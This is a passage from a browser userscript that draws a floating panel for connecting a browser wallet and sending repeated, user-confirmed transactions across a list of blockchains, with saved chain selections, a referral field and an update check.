        selectionButtonsContainer.appendChild(button);
    });

    const saveSelectionButton = document.createElement("button");
    saveSelectionButton.textContent = "Save Selection";
    saveSelectionButton.style.width = "100%";
    saveSelectionButton.style.padding = "5px";
    saveSelectionButton.style.marginTop = "5px";
    saveSelectionButton.style.backgroundColor = "#4CAF50";
    saveSelectionButton.style.color = "#ffffff";
    saveSelectionButton.style.border = "none";
    saveSelectionButton.style.borderRadius = "3px";
    saveSelectionButton.style.cursor = "pointer";
    saveSelectionButton.style.fontSize = "12px";

    const buttons = {};
    Object.entries(blockchains).forEach(([name]) => {
        const checkboxWrapper = document.createElement("div");
        const checkbox = document.createElement("input");
        checkbox.type = "checkbox";
        checkbox.id = `checkbox-${name}`;
        checkbox.checked = buttonVisibility[name] !== undefined ? buttonVisibility[name] : true;
        checkbox.style.marginRight = "5px";

        const label = document.createElement("label");
        label.htmlFor = `checkbox-${name}`;
        label.textContent = name.charAt(0).toUpperCase() + name.slice(1);
        label.style.fontSize = "12px";

        checkboxWrapper.appendChild(checkbox);
        checkboxWrapper.appendChild(label);
        dropdownMenu.appendChild(checkboxWrapper);
    });

    const updateLabel = document.createElement("div");
    updateLabel.textContent = "Checking for update...";
    updateLabel.style.fontSize = "12px";
    updateLabel.style.marginTop = "10px";
    updateLabel.style.color = "#333333";

    const configToggleButton = document.createElement("button");
    configToggleButton.textContent = "Close";
    configToggleButton.style.width = "100%";
    configToggleButton.style.padding = "5px";
    configToggleButton.style.marginTop = "10px";
    configToggleButton.style.backgroundColor = "#FF5722";
    configToggleButton.style.color = "#ffffff";
    configToggleButton.style.border = "none";
    configToggleButton.style.borderRadius = "3px";
    configToggleButton.style.cursor = "pointer";
    configToggleButton.style.fontSize = "12px";

    checkboxContainer.appendChild(enableWindowCheckbox);
    checkboxContainer.appendChild(enableWindowLabel);

    configContainer.appendChild(configTitle);
    configContainer.appendChild(updateLabel);
    configContainer.appendChild(refLabel);
    configContainer.appendChild(refInput);
    configContainer.appendChild(saveButton);
    configContainer.appendChild(checkboxContainer);
    configContainer.appendChild(dropdownButton);
    configContainer.appendChild(dropdownMenu);
    configContainer.appendChild(selectionButtonsContainer);
    configContainer.appendChild(saveSelectionButton);
    configContainer.appendChild(configToggleButton);
    checkForUpdate(GM_info.script.version, updateLabel);
    setInterval(() => checkForUpdate(GM_info.script.version, updateLabel), 30 * 60 * 1000);

    document.body.appendChild(miniIconContainer);
    document.body.appendChild(configContainer);

    const container = document.createElement("div");
    container.style.position = "fixed";
    container.style.top = "10px";
    container.style.right = "10px";
    container.style.zIndex = "9999";
    container.style.background = "#ffffff";
    container.style.padding = "10px";
    container.style.border = "2px solid #000000";
    container.style.borderRadius = "5px";
    container.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
    container.style.maxWidth = "300px";
    container.style.minHeight = "300px";
    container.style.overflowY = "auto";

    const closeButton = document.createElement("button");
    closeButton.textContent = "✖";
    closeButton.style.position = "absolute";
    closeButton.style.top = "5px";
    closeButton.style.right = "5px";
    closeButton.style.width = "30px";
    closeButton.style.height = "30px";
    closeButton.style.padding = "0";
    closeButton.style.backgroundColor = "#FF5722";
    closeButton.style.color = "#ffffff";
    closeButton.style.border = "none";
    closeButton.style.borderRadius = "50%";
    closeButton.style.cursor = "pointer";
    closeButton.style.fontSize = "12px";
    closeButton.style.lineHeight = "20px";

    const toggleButton = document.createElement("button");
    toggleButton.textContent = "Hide";
    toggleButton.style.width = "80%";
    toggleButton.style.padding = "6px";
    toggleButton.style.marginBottom = "5px";
    toggleButton.style.backgroundColor = "#333333";
    toggleButton.style.color = "#ffffff";
    toggleButton.style.border = "none";
    toggleButton.style.borderRadius = "3px";
    toggleButton.style.cursor = "pointer";
    toggleButton.style.fontSize = "10px";

    const connectButton = document.createElement("button");
    connectButton.textContent = "Connect";
    connectButton.style.width = "100%";
    connectButton.style.padding = "6px";
    connectButton.style.marginBottom = "5px";
    connectButton.style.backgroundColor = "#4CAF50";
    connectButton.style.color = "#ffffff";
    connectButton.style.border = "none";
    connectButton.style.borderRadius = "3px";
    connectButton.style.cursor = "pointer";
    connectButton.style.fontSize = "12px";

    const countLabel = document.createElement("label");
    countLabel.textContent = "Number of transactions:";
    countLabel.style.fontSize = "11px";
    countLabel.style.color = "#333333";
    countLabel.style.display = "block";
    countLabel.style.marginBottom = "5px";

    const countInput = document.createElement("input");
    countInput.type = "number";
    countInput.value = 1;
    countInput.min = 1;
    countInput.style.width = "50px";
    countInput.style.padding = "4px";
    countInput.style.marginBottom = "5px";
    countInput.style.border = "1px solid #ccc";
    countInput.style.borderRadius = "3px";
    countInput.style.fontSize = "11px";

    const status = document.createElement("div");
    status.textContent = "Not connected";
    status.style.marginBottom = "5px";
    status.style.fontSize = "11px";
    status.style.color = "#333333";
    status.style.whiteSpace = "normal";
    status.style.maxWidth = "260px";
    status.style.minHeight = "30px";

    container.appendChild(closeButton);
    container.appendChild(toggleButton);
    container.appendChild(status);
    container.appendChild(connectButton);
    container.appendChild(countLabel);
    container.appendChild(countInput);

    const blockchainGrid = document.createElement("div");
    blockchainGrid.style.display = "grid";
    blockchainGrid.style.gridTemplateColumns = "1fr 1fr";
    blockchainGrid.style.gap = "5px";
    blockchainGrid.style.marginBottom = "5px";
    blockchainGrid.style.maxHeight = "400px";
    blockchainGrid.style.overflowY = "auto";

    Object.entries(blockchains).forEach(([name, props]) => {
        const button = document.createElement("button");
        button.textContent = name.charAt(0).toUpperCase() + name.slice(1);
        button.style.padding = "6px";
        button.style.backgroundColor = props.color;
        button.style.color = "#ffffff";
        button.style.border = "none";
        button.style.borderRadius = "3px";
        button.style.cursor = "pointer";
        button.style.fontSize = "12px";
        button.style.display = typeof buttonVisibility[name] === "undefined" || buttonVisibility[name] ? "block" : "none";
        button.disabled = true;
        buttons[name] = button;
        button.addEventListener("click", () => sendTransfer(props.id, name, props.address));
        blockchainGrid.appendChild(button);
    });

    const separator = document.createElement("hr");
    separator.style.border = "none";
    separator.style.borderTop = "1px solid #ccc";
    separator.style.margin = "10px 0";

    const allButton = document.createElement("button");
    allButton.textContent = "ALL";
    allButton.style.width = "100%";
    allButton.style.padding = "6px";
    allButton.style.marginBottom = "5px";
    allButton.style.backgroundColor = "#2196F3";
    allButton.style.color = "#ffffff";
    allButton.style.border = "none";
    allButton.style.borderRadius = "3px";
    allButton.style.cursor = "pointer";
    allButton.style.fontSize = "12px";
    allButton.disabled = true;

    allButton.addEventListener("click", async () => {
        if (!connectedAccount) {
            status.textContent = "Error: Connect wallet first";
            return;
        }

        const transferCount = parseInt(countInput.value) || 1;
        status.textContent = "Starting ALL transactions...";

        try {
            for (const [name, props] of Object.entries(blockchains)) {
                if (buttonVisibility[name]) {
                    status.textContent = `Switching to ${name}...`;
                    await sendTransfer(props.id, name, props.address);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            status.textContent = `${transferCount} transaction(s) completed on all chains!`;
        } catch (error) {
            if (error.isUserRejected) {
                status.textContent = `Stopped: Transaction rejected on ${error.chainName}`;
            } else {
                status.textContent = `Error ALL: ${error.message}`;
            }
        }
    });

    container.appendChild(blockchainGrid);
    container.appendChild(separator);
    container.appendChild(allButton);

    if (GM_getValue("enableTransferWindow", true)) {
        document.body.appendChild(container);
    }

    saveButton.addEventListener("click", () => {
        const userRef = refInput.value.trim();
        GM_setValue("userRef", userRef);
        alert(`Referral saved: ${userRef}`);
        window.location.reload();
    });

    miniIconContainer.addEventListener("click", () => {
        configContainer.style.display = "block";
        miniIconContainer.style.display = "none";
    });

    configToggleButton.addEventListener("click", () => {
        configContainer.style.display = "none";
        miniIconContainer.style.display = "flex";
        isSavePending = false;
        saveSelectionButton.style.backgroundColor = "#4CAF50";
    });

    dropdownButton.addEventListener("click", () => {
        dropdownMenu.style.display = dropdownMenu.style.display === "none" ? "block" : "none";
    });

    selectionButtons.ALL.addEventListener("click", () => {
        isSavePending = false;
        saveSelectionButton.style.backgroundColor = "#4CAF50";
        Object.keys(blockchains).forEach(chain => {
            if (buttons[chain]) {
                buttonVisibility[chain] = true;
                buttons[chain].style.display = "block";
                const checkbox = dropdownMenu.querySelector(`#checkbox-${chain}`);
                if (checkbox) {
                    checkbox.checked = true;
                }
            }
        });
        GM_setValue("buttonVisibility", buttonVisibility);
    });

    ['1', '2', '3', '4', '5'].forEach(num => {
        selectionButtons[num].addEventListener("click", () => {
            if (isSavePending) {
                savedSelections[num] = { ...buttonVisibility };
                GM_setValue("savedSelections", savedSelections);
                isSavePending = false;
                saveSelectionButton.style.backgroundColor = "#4CAF50";
                alert(`Selection saved to slot ${num}`);
            } else {
                const selection = savedSelections[num] || defaultVisibility;
                Object.keys(blockchains).forEach(chain => {
                    if (buttons[chain]) {
                        buttonVisibility[chain] = selection[chain] !== undefined ? selection[chain] : true;
                        buttons[chain].style.display = buttonVisibility[chain] ? "block" : "none";
                        const checkbox = dropdownMenu.querySelector(`#checkbox-${chain}`);
                        if (checkbox) {
                            checkbox.checked = buttonVisibility[chain];
                        }
                    }
                });
                GM_setValue("buttonVisibility", buttonVisibility);
            }
        });
    });

    selectionButtons.CLEAR.addEventListener("click", () => {
        isSavePending = false;
        saveSelectionButton.style.backgroundColor = "#4CAF50";
        Object.keys(blockchains).forEach(chain => {
            if (buttons[chain]) {
                buttonVisibility[chain] = false;
                buttons[chain].style.display = "none";
                const checkbox = dropdownMenu.querySelector(`#checkbox-${chain}`);
                if (checkbox) {
                    checkbox.checked = false;
                }
            }
        });
        GM_setValue("buttonVisibility", buttonVisibility);
    });

    saveSelectionButton.addEventListener("click", () => {
        isSavePending = true;
        saveSelectionButton.style.backgroundColor = "#2196F3";
    });

    dropdownMenu.addEventListener("change", (e) => {
        if (e.target.type === "checkbox") {
            const chainName = e.target.id.replace("checkbox-", "");
            buttonVisibility[chainName] = e.target.checked;
            if (buttons[chainName]) {
                buttons[chainName].style.display = e.target.checked ? "block" : "none";
            }
            GM_setValue("buttonVisibility", buttonVisibility);
            isSavePending = false;
            saveSelectionButton.style.backgroundColor = "#4CAF50";
        }
    });

    enableWindowCheckbox.addEventListener("change", () => {
        const enableTransferWindow = enableWindowCheckbox.checked;
        GM_setValue("enableTransferWindow", enableTransferWindow);
        if (enableTransferWindow) {
            if (!document.body.contains(container)) {
                document.body.appendChild(container);
            }
            if (container.style.display === "none") {
                container.style.display = "block";
            }
        } else {
            container.remove();
        }
    });

    let connectedAccount = null;

    async function connectWallet() {
        if (typeof unsafeWindow.ethereum === "undefined") {
            status.textContent = "Error: Wallet not detected";
            return;
        }
        try {
            const accounts = await unsafeWindow.ethereum.request({ method: "eth_requestAccounts" });
            if (accounts && accounts.length > 0) {
                connectedAccount = accounts[0];
                status.textContent = `Connected: ${connectedAccount.slice(0, 5)}...${connectedAccount.slice(-5)}`;
                enableTransferButtons(true);
            }
        } catch (error) {
            status.textContent = `Error: ${error.message}`;
        }
    }

    async function switchChain(chainId) {
        try {
            await unsafeWindow.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: `0x${chainId.toString(16)}` }],
            });
            return true;
        } catch (error) {
            status.textContent = `Error switching chain: ${error.message}`;
            throw error;
        }
    }

    async function sendTransfer(chainId, chainName, toAddress) {
        if (!connectedAccount) {
            status.textContent = "Error: Connect wallet first";
            return;
        }

        const transferCount = parseInt(countInput.value) || 1;
        status.textContent = `Switching to ${chainName}...`;

        try {
            await switchChain(chainId);
            const blockchain = blockchains[chainName];
            if (!blockchain) {
                throw new Error(`Blockchain configuration not found for ${chainName}`);
            }

            for (let i = 0; i < transferCount; i++) {
                const txParams = {
                    chainId: `0x${chainId.toString(16)}`,
                    from: connectedAccount,
                    to: toAddress,
                    value: blockchain.value,
                    data: blockchain.data,
                    gas: blockchain.gas
                };

                const txHash = await unsafeWindow.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [txParams],
                });

                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            status.textContent = `${transferCount} transaction(s) completed on ${chainName}!`;
        } catch (error) {
            if (error.code === 4001 || (error.message && error.message.includes("rejected"))) {
                status.textContent = `Transaction rejected on ${chainName}`;
                const rejectError = new Error("Transaction rejected by user");
                rejectError.isUserRejected = true;
                rejectError.chainName = chainName;
                throw rejectError;
            } else {
                status.textContent = `Error on ${chainName}: ${error.message}`;
                throw error;
            }
        }
    }

    function enableTransferButtons(enable) {
        Object.values(buttons).forEach(button => {
            button.disabled = !enable;
        });
        allButton.disabled = !enable;
    }

    closeButton.addEventListener("click", () => {
        container.style.display = "none";
        GM_setValue("enableTransferWindow", false);
        enableWindowCheckbox.checked = false;
    });

    toggleButton.addEventListener("click", () => {
        if (container.style.display !== "none") {
            container.style.display = "none";
        }
    });

    connectButton.addEventListener("click", () => {
        status.textContent = "Connecting...";
        connectWallet();
    });

    async function checkForUpdate(currentVersion, updateLabel) {
        try {
            const response = await fetch(GM_info.script.updateURL);
            const scriptText = await response.text();
            const versionMatch = scriptText.match(/@version\s+([\d.]+[a-z]*)/);
            if (versionMatch && versionMatch[1]) {
                const latestVersion = versionMatch[1];
                if (latestVersion !== currentVersion) {
                    updateLabel.innerHTML = `Update Available: v${latestVersion} <a href="${GM_info.script.updateURL}" target="_blank" style="color: #FF5722; text-decoration: underline;">Download</a>`;
                    updateLabel.style.color = "#FF5722";
                    updateLabel.style.cursor = "pointer";
                } else {
                    updateLabel.textContent = "Up to date";
                    updateLabel.style.color = "#4CAF50";
                }
            } else {
                updateLabel.textContent = "Unable to check update";
                updateLabel.style.color = "#FF9800";
            }
        } catch (error) {
            updateLabel.textContent = "Error checking update";
            updateLabel.style.color = "#FF0000";
        }
    }
})();
